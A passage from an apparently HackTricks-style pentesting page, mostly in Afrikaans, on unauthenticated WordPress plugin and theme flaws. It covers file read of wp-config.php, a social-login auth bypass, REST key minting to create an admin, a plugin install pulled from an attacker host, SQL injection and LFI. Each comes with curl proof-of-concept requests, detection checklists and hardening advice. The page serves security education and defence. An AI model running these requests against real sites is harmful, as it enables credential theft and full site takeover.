echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` is attacker-controlled and concatenated **without sanitisation**. Weereens is die enigste hek 'n **CSRF nonce** wat vanaf die resume page gehaal kan word.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Die bediener antwoord met die inhoud van `wp-config.php`, leaking DB credentials and auth keys.

## Ongeauthentiseerde rekeningoorname via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Baie themes/plugins lewer "social login" helpers blootgestel via admin-ajax.php. As 'n ongeauthentiseerde AJAX-aksie (wp_ajax_nopriv_...) kliënt-verskafde identifiseerders vertrou wanneer provider data ontbreek en dan wp_set_auth_cookie() aanroep, word dit 'n volledige authentication bypass.

Tipiese gebrekkige patroon (vereenvoudigde)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Hoekom dit uitbuitbaar is

- Ongeauthentiseerde bereikbaarheid via admin-ajax.php (wp_ajax_nopriv_… action).
- Geen nonce/capability checks voordat state change plaasvind.
- Ontbrekende OAuth/OpenID provider verification; default branch aanvaar attacker input.
- get_user_by('email', $_POST['id']) gevolg deur wp_set_auth_cookie($uid) autentikeer die versoeker as enige bestaande e-posadres.

Uitbuiting (ongeauthentiseerd)

- Vereistes: attacker kan /wp-admin/admin-ajax.php bereik en ken/raai 'n geldige gebruiker email.
- Stel provider op 'n unsupported value (of laat dit weg) om die default branch te tref en id=<victim_email> te stuur.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

Some plugins expose REST endpoints that mint reusable “connection keys” or tokens without verifying the caller’s capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Hoekom dit uitbuitbaar is
- Sensitiewe REST-roete beskerm slegs deur 'n lae-entropie identiteitsbewys (username) of ontbrekende permission_callback
- Geen capability afdwinging; minted key word aanvaar as 'n universele omseiling

Opsporingskontrolelys
- Grep plugin code for register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Enige roete wat tokens/keys uitreik gebaseer op request-supplied identity (username/email) sonder om dit aan 'n authenticated user of capability te koppel
- Kyk vir daaropvolgende roetes wat die minted token/key aanvaar sonder server-side capability checks

Verharding
- Vir enige bevoorregte REST-roete: vereis permission_callback wat current_user_can() afdwing vir die vereiste capability
- Moet nie long-lived keys uit client-supplied identity mint nie; indien nodig, gee short-lived, user-bound tokens ná authentication en herkontroleer capabilities tydens gebruik
- Valideer die caller se user-konteks (wp_set_current_user is alleenlik nie voldoende nie) en verwerp requests waar !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse → nie-geauthentiseerde arbitrêre plugin installasie (FunnelKit Automations ≤ 3.5.3)

Nonces voorkom CSRF, nie magtiging nie. As kode 'n nonce pas as 'n groen lig beskou en dan capability checks vir bevoorregte operasies oorslaan (bv. install/activate plugins), kan nie-geauthentiseerde aanvallers 'n swak nonce-vereiste voldoen en RCE bereik deur 'n backdoored of vulnerable plugin te installeer.

- Vulnerable path: plugin/install_and_activate
- Fout: swak nonce hash check; geen current_user_can('install_plugins'|'activate_plugins') een maal nonce “passes” nie
- Impak: volledige kompromittering via arbitrêre plugin install/activation

PoC (vorm hang af van plugin; slegs illustratief)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Opsporingskontrolelys
- REST/AJAX handlers wat plugins/themes wysig met slegs wp_verify_nonce()/check_admin_referer() en geen capability check nie
- Enige code path wat $skip_caps = true stel ná nonce-validasie

Verharding
- Hanteer nonces altyd slegs as CSRF tokens; dwing capability checks af ongeag nonce-status
- Vereis current_user_can('install_plugins') en current_user_can('activate_plugins') voordat installer code bereik word
- Weier ongeauthentiseerde toegang; vermy om nopriv AJAX actions bloot te stel vir geprivilegieerde flows

---

## Onauthentiseerde SQLi via die s (search) parameter in depicter-* actions (Depicter Slider ≤ 3.6.1)

Verskeie depicter-* actions het die s (search) parameter verbruik en dit in SQL queries gekonkatenereer sonder parameterisering.

- Parameter: s (search)
- Kwetsbaarheid: direkte stringkonkatenering in WHERE/LIKE clauses; geen prepared statements/sanitization
- Impak: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Opsporingskontrolelys
- Grep vir depicter-* aksiehandelaars en direkte gebruik van $_GET['s'] of $_POST['s'] in SQL
- Hersien pasgemaakte queries wat aan $wpdb->get_results()/query() deurgegee word en s saamvoeg

Verharding
- Gebruik altyd $wpdb->prepare() of wpdb placeholders; weier onverwagte metakarakters aan die bedienerkant
- Voeg 'n streng allowlist vir s by en normaliseer na die verwagte charset/lengte

---

## Ongeauthentiseerde Local File Inclusion via nie-gevalideerde template/file path (Kubio AI Page Builder ≤ 2.5.1)

Die aanvaar van aanvaller-beheerde paaie in 'n template-parameter sonder normalisering/beperking maak dit moontlik om arbitrêre plaaslike lêers te lees, en soms kode-uitvoering as inkludeerbare PHP/log-lêers in die runtime ingesleep word.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: geen normalisering/allowlisting nie; traversal toegelaat
- Impak: geheimonthulling (wp-config.php), potensiële RCE in spesifieke omgewings (log poisoning, inkludeerbare PHP)

PoC – lees wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Opsporingskontrolelys
- Enige handler wat versoekpaaie in include()/require()/read sinks aanmekaar koppel sonder realpath() containment
- Soek na traversal-patrone (../) wat buite die beoogde templates directory bereik

Verharding
- Dwing toegelate templates af; los op met realpath() en vereis str_starts_with(realpath(file), realpath(allowed_base))
- Normaliseer insette; verwerp traversal-sekwense en absolute paaie; gebruik sanitize_file_name() slegs vir lêernamme (nie volledige paaie nie)


## Verwysings

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
